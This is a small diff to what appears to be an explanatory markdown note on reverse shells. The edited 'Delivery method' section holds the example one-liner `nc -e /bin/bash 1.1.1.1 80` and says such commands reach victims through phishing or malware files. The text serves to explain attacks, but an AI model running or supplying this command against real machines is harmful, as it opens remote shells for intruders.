@@ -28,4 +28,6 @@ If computer B is inside a private network without dedicated public IP or compute
 
 # 3. Delivery method
 
-Reversed shell command (like `nc -e /bin/bash 1.1.1.1 80`) can be delivered to victim 
+Reversed shell command (like `nc -e /bin/bash 1.1.1.1 80`) can be delivered to victim computer using various methods (like: phishing emails, malware files, ...).
+
+When victims are tricked to execute those commands, attackers has remote accesses to victims' computer. 
